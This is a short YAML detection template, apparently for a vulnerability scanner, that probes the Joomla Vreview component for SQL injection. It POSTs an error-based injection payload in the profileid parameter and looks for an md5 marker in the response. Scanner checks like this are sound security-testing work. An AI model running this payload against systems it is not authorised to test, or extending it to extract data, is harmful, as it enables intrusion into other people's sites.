expression: r0()
id: joomla-component-vreview-sql
info:
  author: "\u5357\u65B9\u6709\u68A6(https://github.com/hackgov)"
  name: Joomla Component Vreview sql
  severity: high
rules:
  r0:
    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
    request:
      body: profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5({{r1}}),0x7e,FLOOR(RAND(0)*2))
        HAVING MIN(0)#
      follow_redirects: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /index.php?option=com_vreview&task=displayReply
set:
  r1: randomInt(800000000, 1000000000)
